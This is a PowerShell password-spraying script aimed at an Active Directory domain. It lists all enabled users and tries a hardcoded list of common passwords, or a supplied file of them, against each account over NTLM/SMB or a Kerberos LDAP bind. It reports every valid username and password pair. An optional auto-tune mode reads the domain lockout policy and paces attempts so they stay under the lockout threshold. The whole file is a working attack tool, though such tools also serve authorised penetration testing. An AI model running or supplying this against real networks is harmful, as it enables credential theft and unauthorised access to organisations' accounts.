Param
 (
    $Domain = 'ant.trd.com',
    $AuthType = 'Kerberos',
    [switch]$OnlyShowAuccess = $True,
    [switch]$EnableJitter,
    [switch]$AutoTune,
    $PasswordFile,
    $PassowrdSprayResultsFile
 )

$DomainDCInfo = Get-ADDomainController -Discover -DomainName $Domain
$DomainDC = $DomainDCInfo.Name
$DomainDCIP = $DomainDCInfo.IPv4Address
[array]$DomainInfo = Get-ADDomain -Server $DomainDC
$DomainInfoDNS = $DomainInfo.DNSRoot
$RemotePath = "\\$DomainInfoDNS\SYSVOL"

IF ($AutoTune -eq $True)
 { 
    $DomainPasswordPolicy = Get-ADDefaultDomainPasswordPolicy -Server $DomainDC 
     Write-Host "Lockout Threshold is $($DomainPasswordPolicy.LockoutThreshold) with an Observation window of $($DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes) minutes"
    IF ($DomainPasswordPolicy.LockoutThreshold -gt 0)
     {       
        $TotalAttempts = ($DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes / $DomainPasswordPolicy.LockoutThreshold) - 1
        $WaitTimeInMinutes = $DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes / $TotalAttempts
     }
    ELSE
     { $WaitTimeInMinutes = 1 }
 }


IF (!$PasswordFile)                                                                                
 { [array]$PasswordArray = @('Password99!','Password1234','P@ssw0rd1','1234Password','Password123!','Qwerty!','Zxcvbnm!','Qwertyuiop!','1234asdf!','qwer1234!') }
IF ($PasswordFile)
 { [array]$PasswordArray = Import-CSV $PasswordFile }

[array]$UserAccountArray = Get-ADUser -Filter * -Server $DomainDC | Where { $_.Enabled -eq $True} 
$UserAccountArray = $UserAccountArray | Sort-Object SamAccountName

Write-Host "Password Spraying using $AuthType against $($UserAccountArray.count) users using $($PasswordArray.Count) passwords..."
ForEach ($PasswordArrayItem in $PasswordArray)
 {
    # Write-host "Password spraying $($UserAccountArray.count) users with the password $PasswordArrayItem"
    ForEach ($UserAccountArrayItem in $UserAccountArray)
     {
        $username = $DomainInfo.NetBIOSName + '\' + $UserAccountArrayItem.SamAccountName

        If ($OnlyShowAuccess -ne $True)
         { Write-Host "Password spraying username $($UserAccountArrayItem.SamAccountName) with password $PasswordArrayItem" }

        IF ($AuthType -eq 'NTLM')
          { 
            TRY
             {
                $outputSMB = @()
                $password = ConvertTo-SecureString $PasswordArrayItem -AsPlainText -Force
                $cred = New-Object System.Management.Automation.PSCredential($username, $password)
                $outputSMB = New-SmbMapping -RemotePath $RemotePath -Credential $cred -ErrorAction Stop
                Remove-SmbMapping -RemotePath $RemotePath -Force
                IF ($outputSMB.Status -eq 'Ok')
                 { write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan }
             }
            CATCH
             { write-verbose "Password is incorrect" }
          }
        
        IF ($AuthType -eq 'Kerberos')
          { 
            TRY
             { 
                $outputDSDE = @()
                $outputDSDE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DomainInfo.DistinguishedName)",$username,$PasswordArrayItem) 
                IF ($outputDSDE.distinguishedName)
                 { write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan }
             }
            CATCH 
             { write-verbose "Password is incorrect" }
          }
     }
    IF ($AutoTune -eq $True)
     { Start-Sleep -Seconds $($WaitTimeInMinutes * 60) } 
 }
